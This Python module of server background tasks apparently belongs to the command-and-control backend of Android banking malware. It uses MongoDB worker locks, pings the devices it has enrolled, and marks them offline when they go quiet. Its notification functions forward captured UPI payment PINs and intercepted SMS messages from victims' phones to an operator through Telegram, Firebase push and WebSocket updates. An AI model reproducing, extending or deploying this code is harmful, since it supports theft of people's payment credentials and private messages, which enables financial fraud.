import asyncio
import logging
import os
import json
from typing import Optional, Dict, Any
from datetime import datetime, timedelta, timezone
from .utils.datetime_utils import utc_now, to_iso_string, ensure_utc
from .services.backup_service import BackupService

logger = logging.getLogger(__name__)

_background_tasks_started = {}
_background_tasks_lock = asyncio.Lock()

async def ensure_single_background_task(task_name: str, mongodb=None):
    """Ensure only one worker runs background tasks using MongoDB lock"""
    global _background_tasks_started
    
    async with _background_tasks_lock:
        if _background_tasks_started.get(task_name, False):
            return False
        
        if mongodb:
            try:
                now = utc_now()
                
                # Check if lock exists and is stale (older than 15 minutes)
                try:
                    existing_lock = await mongodb.db.background_locks.find_one({"_id": f"bg_task_lock_{task_name}"})
                    if existing_lock:
                        last_heartbeat = existing_lock.get("last_heartbeat")
                        if last_heartbeat:
                            # Ensure last_heartbeat is timezone-aware
                            last_heartbeat_utc = ensure_utc(last_heartbeat)
                            if last_heartbeat_utc:
                                time_diff = (now - last_heartbeat_utc).total_seconds()
                                if time_diff > 10:  # 10 seconds (for fast recovery after restart)
                                    logger.warning(f"⚠️ Stale lock found for '{task_name}' (last heartbeat: {time_diff:.0f}s ago). Removing...")
                                    await mongodb.db.background_locks.delete_one({"_id": f"bg_task_lock_{task_name}"})
                                else:
                                    logger.info(f"⏭️ Background task '{task_name}' already running in another worker (lock exists, heartbeat: {time_diff:.0f}s ago)")
                                    return False
                            else:
                                # Invalid heartbeat, consider it stale
                                logger.warning(f"⚠️ Lock with invalid heartbeat found for '{task_name}'. Removing...")
                                await mongodb.db.background_locks.delete_one({"_id": f"bg_task_lock_{task_name}"})
                        else:
                            # Lock exists but no heartbeat, consider it stale
                            logger.warning(f"⚠️ Lock without heartbeat found for '{task_name}'. Removing...")
                            await mongodb.db.background_locks.delete_one({"_id": f"bg_task_lock_{task_name}"})
                except Exception as lock_check_error:
                    logger.error(f"❌ Error checking for stale lock: {lock_check_error}", exc_info=True)
                    # Continue and try to acquire lock anyway
                
                lock_doc = {
                    "_id": f"bg_task_lock_{task_name}",
                    "worker_pid": os.getpid(),
                    "acquired_at": now,
                    "last_heartbeat": now,
                    "task": task_name
                }
                
                try:
                    await mongodb.db.background_locks.insert_one(lock_doc)
                    logger.info(f"✅ Background task '{task_name}' lock acquired by worker PID: {os.getpid()}")
                    _background_tasks_started[task_name] = True
                    return True
                except Exception as e:
                    if "duplicate key" in str(e).lower() or "E11000" in str(e):
                        logger.debug(f"⏭️ Background task '{task_name}' already running in another worker (lock exists)")
                        return False
                    logger.error(f"❌ Failed to insert lock for '{task_name}': {e}", exc_info=True)
                    raise
            except Exception as e:
                logger.warning(f"Failed to acquire lock for '{task_name}': {e}")
                return False
        else:
            if not _background_tasks_started.get(task_name, False):
                _background_tasks_started[task_name] = True
                logger.info(f"Background task '{task_name}' started by worker PID: {os.getpid()}")
                return True
            return False

class BackgroundTaskManager:

    def __init__(self):
        self.pending_tasks = []

    async def send_telegram_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        try:
            method = getattr(service, method_name)
            await method(*args, **kwargs)
            logger.debug(f"Telegram notification sent: {method_name}")
        except Exception as e:
            logger.warning(f"Failed to send Telegram notification: {e}")

    async def send_push_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        try:
            method = getattr(service, method_name)
            result = await method(*args, **kwargs)
            logger.debug(f"Push notification sent: {method_name}")
            return result
        except Exception as e:
            logger.warning(f"Failed to send push notification: {e}")
            return None

    async def log_activity(
        self,
        service,
        *args,
        **kwargs
    ):
        try:
            await service.log_activity(*args, **kwargs)
            logger.debug(f"Activity logged")
        except Exception as e:
            logger.warning(f"Failed to log activity: {e}")

background_tasks = BackgroundTaskManager()

async def send_telegram_in_background(
    telegram_service,
    admin_username: str,
    message: str,
    bot_index: Optional[int] = None
):
    try:
        await telegram_service.send_to_admin(
            admin_username,
            message,
            bot_index=bot_index
        )
    except Exception as e:
        logger.warning(f"Background telegram failed: {e}")

async def send_push_in_background(
    firebase_service,
    admin_username: str,
    title: str,
    body: str,
    data: Optional[Dict[str, Any]] = None
):
    try:
        await firebase_service.send_notification_to_admin(
            admin_username,
            title,
            body,
            data or {}
        )
    except Exception as e:
        logger.warning(f"Background push failed: {e}")

async def notify_device_registration_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    device_info: Dict[str, Any],
    admin_token: str
):
    try:

        await telegram_service.notify_device_registered(
            admin_username=admin_username,
            device_id=device_id,
            device_info=device_info
        )

        app_type = device_info.get('app_type', 'Unknown')
        model = device_info.get('model', 'Unknown')

        await firebase_service.send_device_registration_notification(
            admin_username=admin_username,
            device_id=device_id,
            app_type=app_type,
            model=model
        )

        logger.debug(f"? Device registration notifications sent for {device_id}")

    except Exception as e:
        logger.warning(f"Background device registration notification failed: {e}")

async def notify_upi_detected_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    upi_pin: str,
    status: str,
    model: Optional[str] = None
):
    try:

        await telegram_service.notify_upi_detected(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin,
            status=status
        )

        await firebase_service.send_upi_pin_notification(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin,
            status=status,
            model=model
        )

        logger.debug(f"? UPI detection notifications sent for {device_id}")

    except Exception as e:
        logger.warning(f"Background UPI notification failed: {e}")

async def notify_admin_login_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    success: bool = True
):
    try:
        await telegram_service.notify_admin_login(
            admin_username=admin_username,
            ip_address=ip_address,
            success=success
        )
        logger.debug(f"? Admin login notification sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background admin login notification failed: {e}")

async def notify_admin_logout_bg(
    telegram_service,
    admin_username: str,
    ip_address: str
):
    try:
        await telegram_service.notify_admin_logout(
            admin_username=admin_username,
            ip_address=ip_address
        )
        logger.debug(f"? Admin logout notification sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background admin logout notification failed: {e}")

async def send_2fa_code_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    code: str,
    message_prefix: Optional[str] = None
):
    try:
        await telegram_service.send_2fa_notification(
            admin_username=admin_username,
            ip_address=ip_address,
            code=code,
            message_prefix=message_prefix
        )
        logger.debug(f"? 2FA code sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background 2FA notification failed: {e}")

async def notify_new_sms_bg(
    telegram_service,
    device_id: str,
    admin_username: str,
    sender: str,
    message: str
):
    try:
        await telegram_service.notify_new_sms(
            device_id=device_id,
            admin_username=admin_username,
            sender=sender,
            message=message
        )
        logger.debug(f"New SMS notification sent for device {device_id}")
    except Exception as e:
        logger.warning(f"Background new SMS notification failed: {e}")

async def send_multiple_notifications_bg(
    telegram_service,
    firebase_service,
    notifications: list
):
    tasks = []

    for notif in notifications:
        if notif["type"] == "telegram":
            method = getattr(telegram_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))
        elif notif["type"] == "push":
            method = getattr(firebase_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    for i, result in enumerate(results):
        if isinstance(result, Exception):
            logger.warning(f"Notification {i} failed: {result}")

    logger.debug(f"? Batch notifications sent: {len(notifications)}")

async def check_offline_devices_bg(mongodb):
    can_run = await ensure_single_background_task("check_offline_devices", mongodb)
    if not can_run:
        logger.debug("Skipping check_offline_devices_bg - already running in another worker")
        return
    
    logger.info("Starting offline devices checker background task (worker PID: %s)", os.getpid())
    
    while True:
        try:
            try:
                await mongodb.db.background_locks.update_one(
                    {"_id": "bg_task_lock_check_offline_devices"},
                    {"$set": {"last_heartbeat": utc_now()}}
                )
            except:
                pass

            now = utc_now()
            three_minutes_ago = now - timedelta(minutes=3)
            four_minutes_ago = now - timedelta(minutes=4)
            five_minutes_ago = now - timedelta(minutes=5)

            # Step 1: Find devices that haven't pinged for 3-4 minutes (suspicious) - send FCM ping
            suspicious_devices = await mongodb.db.devices.find({
                "last_ping": {
                    "$lt": three_minutes_ago,
                    "$gte": four_minutes_ago
                },
                "status": "online",
                "$or": [
                    {"fcm_ping_sent_at": {"$exists": False}},
                    {"fcm_ping_sent_at": None}
                ]
            }).to_list(length=None)

            if suspicious_devices:
                logger.info(f"Found {len(suspicious_devices)} suspicious devices (3-4 min no ping), queuing FCM pings...")
                
                device_ids = [d["device_id"] for d in suspicious_devices]
                
                try:
                    from app.services.fcm_queue_service import fcm_queue_service, Priority
                    
                    # Initialize queue service if not already initialized
                    if not fcm_queue_service._is_initialized:
                        await fcm_queue_service.initialize()
                    
                    if fcm_queue_service._is_initialized:
                        # Enqueue with HIGH priority (urgent - device hasn't pinged in 3-4 min)
                        enqueued = await fcm_queue_service.enqueue(
                            device_ids=device_ids,
                            priority=Priority.HIGH,
                            metadata={"reason": "suspicious_device", "timestamp": now.isoformat()}
                        )
                        
                        # Update fcm_ping_sent_at for all suspicious devices
                        await mongodb.db.devices.update_many(
                            {"device_id": {"$in": device_ids}},
                            {"$set": {"fcm_ping_sent_at": now}}
                        )
                        logger.info(f"✅ Queued {enqueued} devices for FCM ping (HIGH priority)")
                    else:
                        # Queue not available, fallback to direct ping (slower)
                        logger.warning("⚠️ Queue not available, using direct FCM ping (slower)")
                        from .services.firebase_service import firebase_service
                        ping_tasks = [firebase_service.ping_device(did) for did in device_ids]
                        await asyncio.gather(*ping_tasks, return_exceptions=True)
                        await mongodb.db.devices.update_many(
                            {"device_id": {"$in": device_ids}},
                            {"$set": {"fcm_ping_sent_at": now}}
                        )
                except Exception as e:
                    logger.error(f"❌ Failed to queue FCM pings: {e}", exc_info=True)

            # Step 2: Mark devices as offline if:
            # - Haven't pinged for 5+ minutes, OR
            # - FCM ping was sent but still no ping after 5 minutes
            devices_to_mark_offline = await mongodb.db.devices.find({
                "last_ping": {"$lt": five_minutes_ago},
                "status": "online"
            }).to_list(length=None)

            if devices_to_mark_offline:
                device_ids = [d["device_id"] for d in devices_to_mark_offline]
                
                # Update devices to offline
                result = await mongodb.db.devices.update_many(
                    {
                        "last_ping": {"$lt": five_minutes_ago},
                        "status": "online"
                    },
                    {
                        "$set": {
                            "status": "offline",
                            "is_online": False,
                            "last_online_update": now,
                            "fcm_ping_sent_at": None  # Reset for next time
                        }
                    }
                )

                if result.modified_count > 0:
                    logger.info(f"Marked {result.modified_count} devices as offline (5 min timeout after FCM ping check)")
                    
                    # Send WebSocket notifications for each offline device
                    from app.services.admin_ws_manager import admin_ws_manager
                    for device_doc in devices_to_mark_offline:
                        try:
                            device_id = device_doc["device_id"]
                            device_payload = {
                                "device_id": device_id,
                                "status": "offline",
                                "is_online": False,
                                "battery_level": device_doc.get("battery_level"),
                                "has_upi": device_doc.get("has_upi", False),
                                "upi_pins": device_doc.get("upi_pins", []),
                                "last_online_update": to_iso_string(now),
                                "updated_at": to_iso_string(now),
                            }
                            await admin_ws_manager.notify_device_update(device_id, device_payload)
                            logger.debug(f"WebSocket notification sent for device going offline: device={device_id}")
                        except Exception as e:
                            logger.warning(f"Failed to send WebSocket notification for offline device {device_doc.get('device_id')}: {e}")
            
            # Reset fcm_ping_sent_at for devices that came back online (pinged after FCM ping was sent)
            await mongodb.db.devices.update_many(
                {
                    "fcm_ping_sent_at": {"$exists": True, "$ne": None},
                    "last_ping": {"$gte": three_minutes_ago},
                    "status": "online"
                },
                {"$unset": {"fcm_ping_sent_at": ""}}
            )

            await asyncio.sleep(120)

        except Exception as e:
            logger.error(f"Error in offline devices checker: {e}")
            await asyncio.sleep(60)

async def restart_all_heartbeats_bg(firebase_service, mongodb=None):
    try:
        logger.info(f"🔍 Attempting to acquire lock for ping task (worker PID: {os.getpid()})...")
        can_run = await ensure_single_background_task("restart_all_heartbeats", mongodb)
        if not can_run:
            logger.info(f"⏭️ Skipping restart_all_heartbeats_bg - already running in another worker (PID: {os.getpid()})")
            return
        
        logger.info("🚀 Starting heartbeat ping background task (worker PID: %s)", os.getpid())
        logger.info("⏳ Waiting 5 seconds before first ping...")
    except Exception as e:
        logger.error(f"❌ Failed to initialize ping background task: {e}", exc_info=True)
        return
    
    # Wait 5 seconds before first ping (to let server fully initialize)
    await asyncio.sleep(5)
    
    logger.info("✅ Wait period complete, starting ping loop...")

    ping_count = 0
    consecutive_errors = 0
    max_consecutive_errors = 3

    while True:
        try:
            # Update lock heartbeat to show task is alive
            if mongodb:
                try:
                    await mongodb.db.background_locks.update_one(
                        {"_id": "bg_task_lock_restart_all_heartbeats"},
                        {"$set": {"last_heartbeat": utc_now()}},
                        upsert=True
                    )
                except Exception as lock_error:
                    logger.warning(f"Failed to update lock heartbeat: {lock_error}")

            ping_count += 1
            logger.info(f"📡 [Ping Task #{ping_count}] Sending ping to all devices via topic 'all_devices'...")

            try:
                result = await firebase_service.ping_all_devices_topic()

                if result.get("success"):
                    consecutive_errors = 0
                    logger.info(
                        f"✅ [Ping Task #{ping_count}] Ping sent successfully to topic 'all_devices' "
                        f"(Message ID: {result.get('message_id', 'N/A')})"
                    )
                else:
                    consecutive_errors += 1
                    error_msg = result.get('message', 'Unknown error')
                    logger.error(
                        f"❌ [Ping Task #{ping_count}] Failed to send ping: {error_msg} "
                        f"(Consecutive errors: {consecutive_errors}/{max_consecutive_errors})"
                    )
                    
                    if consecutive_errors >= max_consecutive_errors:
                        logger.critical(
                            f"🚨 [Ping Task] Too many consecutive errors ({consecutive_errors}). "
                            f"Task will continue but check Firebase configuration!"
                        )
                        consecutive_errors = 0  # Reset counter but keep task running

            except Exception as ping_error:
                consecutive_errors += 1
                logger.error(
                    f"❌ [Ping Task #{ping_count}] Exception while sending ping: {ping_error}",
                    exc_info=True
                )
                logger.error(f"   Consecutive errors: {consecutive_errors}/{max_consecutive_errors}")

            # Log periodic status
            if ping_count % 6 == 0:  # Every hour (6 * 10 minutes)
                logger.info(
                    f"📊 [Ping Task Status] Total pings sent: {ping_count}, "
                    f"Last ping time: {utc_now().isoformat()}, Worker PID: {os.getpid()}"
                )

            # Wait 10 minutes (600 seconds) before next ping
            await asyncio.sleep(600)

        except asyncio.CancelledError:
            logger.warning("⚠️ [Ping Task] Task cancelled, stopping...")
            break
        except Exception as e:
            consecutive_errors += 1
            logger.error(
                f"❌ [Ping Task] Unexpected error in ping task loop: {e}",
                exc_info=True
            )
            logger.error(f"   Consecutive errors: {consecutive_errors}/{max_consecutive_errors}")
            
            # Wait shorter time on error, but don't stop the task
            wait_time = 120 if consecutive_errors < max_consecutive_errors else 300
            logger.info(f"⏳ [Ping Task] Waiting {wait_time} seconds before retry...")
            await asyncio.sleep(wait_time)
            
            # Reset counter after waiting
            if consecutive_errors >= max_consecutive_errors:
                consecutive_errors = 0
                logger.info("🔄 [Ping Task] Error counter reset, continuing task...")